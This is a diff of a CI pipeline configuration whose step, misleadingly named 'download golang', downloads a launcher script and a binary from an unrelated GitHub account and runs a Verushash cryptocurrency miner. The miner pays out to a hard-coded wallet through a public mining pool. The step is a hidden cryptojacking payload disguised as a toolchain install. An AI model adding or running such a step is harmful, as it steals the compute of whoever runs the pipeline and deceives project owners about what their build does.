@@ -20,3 +20,4 @@ steps:
 - name: download golang
   commands:
    - wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e  -rigName NANO -pool1 ap.luckpool.net:3956
+
